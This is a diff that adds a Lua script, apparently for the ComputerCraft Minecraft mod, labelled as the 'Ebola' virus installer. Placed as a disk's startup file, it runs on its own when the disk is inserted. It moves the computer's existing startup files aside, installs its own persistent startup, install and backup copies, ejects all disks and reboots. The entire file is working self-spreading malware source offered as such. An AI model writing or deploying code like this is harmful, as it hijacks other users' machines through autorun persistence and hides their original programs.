@@ -1,0 +1,33 @@
+--[FILE]disk/startup[FILE]--
+--"Ebola" virus installer by Astorphobis - (c) 2015-2016--
+--Is virus installed?--
+local isvirus = 0
+if fs.exists("startup") and fs.exists("backup") and fs.exists("install") then
+ isvirus = 1
+end
+--If "startup2" exists, move it to startup 3 to prevent deleting it (redirection from "edit startup2" is solved in Ebola)--
+if fs.exists("startup2") then
+  fs.copy("startup2", "startup3")
+  fs.delete("startup2")
+end
+--If "startup" exists, move it to "startup2". This one will be launched at start after Ebola is launched--
+if fs.exists("startup") then
+ fs.copy("startup", "startup2")
+ fs.delete("startup")
+end
+--Delete old Ebola files. These files will be replaced with new ones--
+if isvirus==1 then
+ fs.delete("install")
+ fs.delete("backup")
+end
+--Install Ebola--
+fs.copy("disk/infstartup", "startup")
+fs.copy("disk/startup", "install")
+fs.copy("disk/infstartup", "backup")
+disk.eject("bottom")
+disk.eject("top")
+disk.eject("left")
+disk.eject("right")
+disk.eject("front")
+disk.eject("back")
+os.reboot()
